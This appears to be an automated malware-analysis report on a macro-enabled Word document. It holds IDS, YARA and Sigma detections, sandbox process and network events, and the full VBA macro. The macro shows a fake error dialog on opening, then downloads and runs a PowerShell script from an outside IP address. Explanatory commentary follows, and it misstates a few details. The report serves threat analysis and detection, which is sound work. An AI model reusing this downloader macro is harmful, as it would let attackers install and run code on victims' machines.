crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )

crowdsourced_ids_results.rule_msg: ET INFO PS1 Powershell File Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO PS1 Powershell File Request"; flow:established,from_client; flowbits:set,ET.PS.Download; http.request_line; content:".ps1 HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2032162; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2021_03_18, deployment Perimeter, former_category INFO, signature_severity Informational, updated_at 2021_03_18;)

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Program Files\Microsoft Office\root\Templates\HajjReport.docm.doc" /q; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; DestinationIp=45.140.147.81; Protocol=tcp; SourceIp=192.168.2.27; DestinationIsIpv6=false; EventID=3; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; SourcePort=49740; Initiated=true}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Program Files\Microsoft Office\root\Templates\HajjReport.docm.doc" /q; CommandLine=POWERSHELL.exe "C:\Users\Public\doomsday.ps1"; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

macros.vba_code:
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
    ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub document_open()
    Message = "Error converting document version from type '03'!" + vbNewLine + "Failure code: 0x4AG59C"
    Title = "Office content conversion error"
    Choice = MsgBox(Message, vbExclamation + vbRetryCancel, Title)
    If Choice > 0 Then MessageClosed
End Sub
Sub MessageClosed()
    downloadfile
End Sub
Sub downloadfile()
imgsrc = "http://45.140.147.81/doomsday.ps1"
dlpath = "C:\Users\Public\"
URLDownloadToFile 0, imgsrc, dlpath & "doomsday.ps1", 0, 0
x = Shell("POWERSHELL.exe " & _
           """C:\Users\Public\doomsday.ps1""", 1)
End Sub

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

crowdsourced_ai_results.analysis:
The provided VBA macro code is malicious and could potentially cause harm to the system. The code declares a function named `URLDownloadToFile` that downloads a file from a remote location to a specific path on the system. The function is then called in the `downloadfile` subroutine, which downloads a PowerShell script from a remote location and executes it using the `Shell` function.

The malicious code is using the `URLDownloadToFile` function to download a PowerShell script from a remote location, and then executing it using the `Shell` function. This could potentially allow the attacker to gain control of the system and execute malicious commands.

Additionally, the code is using the `MsgBox` function to display a message to the user, which could potentially be used to trick the user into clicking on a malicious link or button.

Overall, the provided VBA macro code is malicious and should be treated with caution. It is recommended to remove the code and take steps to prevent future attacks.

The macros extracted from the document exhibit clear signs of malicious intent. Upon opening the document, the 'document_open' subroutine displays a fake error message related to document conversion, aiming to deceive the user. The user is prompted with an option to retry or cancel, and if any choice other than cancel is made, the 'MessageClosed' subroutine is triggered.

In the 'MessageClosed' subroutine, the 'downloadfile' subroutine is called. The 'downloadfile' subroutine constructs a URL pointing to a PowerShell script hosted at "http://45.140.147.81/doomsday.ps1" and attempts to download it to the local machine under "C:\Users\Public\" as "doomsday.ps1" using the 'URLDownloadToFile' function. Subsequently, the downloaded PowerShell script is executed using the 'Shell' function with the command "POWERSHELL.exe \"C:\\Users\\Public\\doomsday.ps1\"" in a hidden window (parameter 1).

This behavior indicates a clear attempt to download and execute a potentially malicious PowerShell script without the user's consent, which could lead to various harmful actions on the system.

The macro named 'document_open' is triggered when the document is opened. It displays a message box with an error message and two options: 'Retry' and 'Cancel'. If the user selects 'Retry', the macro 'MessageClosed' is executed.

The 'MessageClosed' macro calls the 'downloadfile' macro. The 'downloadfile' macro downloads a file named 'doomsday.ps1' from the URL 'http://45.140.147.81/doomsday.ps1' to the location 'C:\\Users\\Public\\doomsday.ps1'.

After downloading the file, the macro executes the downloaded PowerShell script using the Shell function. This PowerShell script could potentially perform malicious actions on the system.
